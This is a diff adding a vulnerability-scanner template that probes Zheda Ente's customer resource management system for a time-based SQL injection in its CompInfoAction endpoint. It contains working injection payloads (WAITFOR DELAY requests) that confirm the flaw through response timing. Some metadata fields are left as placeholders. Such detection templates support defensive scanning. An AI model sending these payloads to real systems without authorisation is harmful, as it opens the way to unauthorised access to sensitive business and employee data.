@@ -1,0 +1,25 @@
+id: entsoft-CompInfoAction-sqli
+
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 浙大恩特客户资源管理系统 CompInfoAction 接口存在 SQL 注入漏洞，攻击者可通过输入恶意 SQL 代码，突破系统原本设定的访问规则，未经授权访问、修改或删除数据库中的各类敏感信息，包括但不限于员工个人资料、企业核心业务数据等。
+  reference:
+    - http://kpanda.wiki/#/Vulnhub/Z1-10%E6%B5%99%E5%A4%A7%E6%81%A9%E7%89%B9-%E5%AE%A2%E6%88%B7%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-SQL?id=z1-10%e6%b5%99%e5%a4%a7%e6%81%a9%e7%89%b9-%e5%ae%a2%e6%88%b7%e8%b5%84%e6%ba%90%e7%ae%a1%e7%90%86%e7%b3%bb%e7%bb%9f-sql
+  tags: tags
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/entsoft/CompInfoAction.emrser;.js?compnum=1%27%3BWAITFOR+DELAY+%270%3A0%3A3%27--&method=selectCompBank"
+      - "{{BaseURL}}/entsoft/CompInfoAction.emrser;.js?compnum=1%27%3BWAITFOR+DELAY+%270%3A0%3A6%27--&method=selectCompBank"
+      - "{{BaseURL}}/entsoft/CompInfoAction.emrser;.js?compnum=1%27%3BWAITFOR+DELAY+%270%3A0%3A9%27--&method=selectCompBank"
+
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>=3  && duration_1<=6"
+          - "duration_2>=6  && duration_2<=9"
+          - "duration_3>=9  && duration_3<=12"
